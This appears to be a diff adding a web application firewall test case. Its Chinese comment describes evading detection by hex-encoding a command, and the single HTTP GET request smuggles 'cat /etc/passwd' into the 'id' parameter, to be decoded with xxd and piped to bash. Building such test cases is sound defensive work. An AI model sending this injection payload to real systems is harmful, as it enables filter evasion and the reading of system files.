@@ -1,0 +1,9 @@
+# 命令执行(十六进制编码绕过)
+# 将命令 cat /etc/passwd转换为十六进制字符串 636174202f6574632f706173737764 隐藏特征，利用管道符和linux命令还原十六进制字符串并执行命令。
+GET /?id=echo%20%22636174202f6574632f706173737764%22%20%7C%20xxd%20-r%20-p%20%7C%20bash&bid=hd_tag_m8mv247k HTTP/1.1
+Host: www.swaf.com
+RM-PRO-BusinessID: hd_tag_m8mv247k
+RM-PRO-Token: 869af4f7ea460797588c58e6158c02f9
+RM-PRO-Time: 1742808367251
+User-Agent: curl/7.83.1
+
